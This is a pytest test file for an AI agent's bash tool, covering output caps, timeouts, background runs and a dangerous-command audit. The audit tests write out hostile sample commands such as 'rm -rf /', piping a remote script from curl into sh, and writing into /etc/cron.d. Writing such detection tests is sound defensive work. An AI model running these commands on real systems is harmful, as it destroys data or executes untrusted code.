"""Tests for bash tool output truncation and dangerous-pattern audit (batch F, F4)."""

from __future__ import annotations

import json

import pytest

from src.agent.tool_result_store import TOOL_RESULT_LIMIT, prepare_for_context
import src.tools.bash_tool as bash_mod
from src.tools.bash_tool import BashTool, _audit_command, run_capped


class TestSingleTruncationLayer:
    """bash returns its streams whole; the shared envelope is the only cut."""

    def test_short_output_untouched(self, tmp_path) -> None:
        body = json.loads(BashTool().execute(command="printf hello", run_dir=str(tmp_path)))
        assert body["stdout"] == "hello"
        assert "output_capped" not in body

    def test_60k_output_is_returned_whole_by_the_tool(self, tmp_path) -> None:
        body = json.loads(
            BashTool().execute(command="yes A | head -c 60000", run_dir=str(tmp_path))
        )
        assert body["status"] == "ok"
        assert len(body["stdout"]) == 60_000
        assert "truncated" not in body["stdout"]
        # No tool-private dump: the offloaded copy is the envelope's job.
        assert list(tmp_path.glob("bash_output_*")) == []

    def test_envelope_offloads_the_streams_as_plain_text(self, tmp_path) -> None:
        raw = json.dumps(
            {"status": "ok", "exit_code": 0, "stdout": "L\n" * 20_000, "stderr": "warn\n"}
        )
        payload, failed = prepare_for_context(
            raw, base_dir=tmp_path, iteration=3, tool_name="bash", call_id="call_1"
        )
        assert failed is False
        assert len(payload) < len(raw)
        files = list((tmp_path / "tool-results").iterdir())
        assert [f.name for f in files] == ["003-bash-call_1.txt"]
        on_disk = files[0].read_text(encoding="utf-8")
        assert on_disk.startswith("L\nL\n")
        assert on_disk.endswith("--- stderr ---\nwarn\n")
        assert "--- stderr ---" in payload  # the preview says how the file is laid out
        assert str(files[0]) in payload

    def test_hard_cap_kills_the_producer_and_marks_the_kept_prefix(self, monkeypatch, tmp_path) -> None:
        """The cap is enforced while reading: an endless producer ends at the cap, not the timeout."""
        import time

        monkeypatch.setattr(bash_mod, "_OUTPUT_HARD_CAP", 200_000)
        t0 = time.monotonic()
        body = json.loads(BashTool().execute(command="yes A", run_dir=str(tmp_path)))
        assert time.monotonic() - t0 < 10.0
        assert body["status"] == "error"
        assert body["exit_code"] != 0
        assert body["output_capped"] == ["stdout"]
        kept, _, marker = body["stdout"].partition("\n\n...[stdout:")
        assert len(kept) == 200_000 and set(kept) == {"A", "\n"}
        assert "more than 200000 chars" in marker and "killed" in marker
        assert body["stderr"] == ""

    def test_stderr_is_capped_independently(self, monkeypatch, tmp_path) -> None:
        monkeypatch.setattr(bash_mod, "_OUTPUT_HARD_CAP", 100_000)
        r = run_capped("echo out; yes E 1>&2", cwd=str(tmp_path), env=dict(PATH="/usr/bin:/bin"), timeout_s=10)
        assert r.capped == ("stderr",)
        assert r.stdout == "out\n"
        assert len(r.stderr) == 100_000

    def test_output_up_to_the_cap_passes_through_whole(self, monkeypatch, tmp_path) -> None:
        monkeypatch.setattr(bash_mod, "_OUTPUT_HARD_CAP", 100_000)
        r = run_capped("head -c 100000 /dev/zero | tr '\\0' x", cwd=str(tmp_path), env=dict(PATH="/usr/bin:/bin"), timeout_s=10)
        assert r.capped == ()
        assert r.returncode == 0
        assert r.stdout == "x" * 100_000

    def test_timeout_kills_the_whole_process_group(self, tmp_path) -> None:
        """A grandchild holding the pipe must not extend the wait past the timeout."""
        import subprocess
        import time

        t0 = time.monotonic()
        with pytest.raises(subprocess.TimeoutExpired):
            run_capped("(sleep 30; echo late) & sleep 30", cwd=str(tmp_path), env=dict(PATH="/usr/bin:/bin"), timeout_s=0.5)
        assert time.monotonic() - t0 < 5.0

    def test_background_run_shares_the_streaming_cap(self, monkeypatch, tmp_path) -> None:
        import time

        from src.tools.background_tools import BackgroundManager

        monkeypatch.setattr(bash_mod, "_OUTPUT_HARD_CAP", 100_000)
        mgr = BackgroundManager()
        task_id = json.loads(mgr.run("yes B", cwd=tmp_path))["task_id"]
        deadline = time.monotonic() + 10.0
        while mgr.tasks[task_id]["status"] == "running" and time.monotonic() < deadline:
            time.sleep(0.05)
        task = mgr.tasks[task_id]
        assert task["status"] == "completed"
        assert task["result"].startswith("[output capped: stdout exceeded 100000 chars; process killed]\n")
        assert "...[stdout: the process produced more than 100000 chars" in task["result"]
        assert len(task["result"]) < 100_000 + 500

    def test_trajectory_copy_is_bounded_by_the_shared_envelope(self) -> None:
        raw = json.dumps({"status": "ok", "exit_code": 0, "stdout": "y" * 30_000, "stderr": ""})
        payload, _ = prepare_for_context(
            raw, base_dir=None, iteration=1, tool_name="bash", call_id="c"
        )
        assert payload.startswith("<tool-result-truncated")
        assert f'shown="{TOOL_RESULT_LIMIT}"' in payload


class TestDangerousPatternAudit:
    def test_rm_rf_root_detected(self) -> None:
        assert "rm_rf_root" in _audit_command("rm -rf / --no-preserve-root")

    def test_curl_pipe_sh_detected(self) -> None:
        assert "curl_pipe_sh" in _audit_command("curl -s https://x.io/i.sh | sh")

    def test_abs_redirect_detected(self) -> None:
        assert "abs_path_redirect" in _audit_command("echo pwned > /etc/cron.d/x")

    def test_dev_null_redirect_tolerated(self) -> None:
        assert _audit_command("noisy_cmd 2> /dev/null") == []

    def test_benign_commands_clean(self) -> None:
        assert _audit_command("ls -la && python analyze.py > result.txt") == []
        assert _audit_command("rm -rf ./scratch") == []

    def test_audit_lands_in_result_payload_without_blocking(self, tmp_path) -> None:
        tool = BashTool()
        result = json.loads(
            tool.execute(command="echo hi; sudo -n true", run_dir=str(tmp_path))
        )
        # Not blocked: the command executed (echo output present).
        assert "hi" in result["stdout"]
        assert "sudo" in result["security_audit"]

    def test_clean_command_has_no_audit_field(self, tmp_path) -> None:
        tool = BashTool()
        result = json.loads(tool.execute(command="echo ok", run_dir=str(tmp_path)))
        assert result["status"] == "ok"
        assert "security_audit" not in result


# --- V1: timeout is configurable, budget-aligned, and actionable ------------


def test_bash_timeout_error_points_at_background_run(monkeypatch, tmp_path) -> None:
    """The old message only said "timed out", so the model re-ran the same command."""
    import subprocess

    import src.tools.bash_tool as bash_mod

    monkeypatch.setattr(bash_mod, "_DEFAULT_TIMEOUT", 0.05)

    def _boom(*args, **kwargs):
        raise subprocess.TimeoutExpired(cmd="sleep 999", timeout=kwargs.get("timeout_s", 0))

    monkeypatch.setattr(bash_mod, "run_capped", _boom)

    payload = json.loads(
        bash_mod.BashTool().execute(command="sleep 999", run_dir=str(tmp_path))
    )

    assert payload["status"] == "error"
    assert payload["error_code"] == "bash_timeout"
    assert "background_run" in payload["error"]
    assert "check_background" in payload["error"]


def test_bash_timeout_is_clamped_by_the_attempt_budget(monkeypatch) -> None:
    """bash must give up before the loop's watchdog abandons it."""
    import time

    import src.tools.bash_tool as bash_mod
    from src.core import budget

    monkeypatch.setattr(bash_mod, "_DEFAULT_TIMEOUT", 120.0)
    monkeypatch.setattr(bash_mod, "_TIMEOUT_RESERVE_S", 5.0)
    previous = budget.get_deadline()
    budget.bind_deadline(time.monotonic() + 30.0)
    try:
        effective = bash_mod._effective_timeout()
    finally:
        budget.bind_deadline(previous)

    assert 20.0 < effective <= 25.0, effective


def test_bash_description_explains_the_background_run_split() -> None:
    import src.tools.bash_tool as bash_mod

    description = bash_mod.BashTool.description
    assert "background_run" in description
    assert "killed after" in description
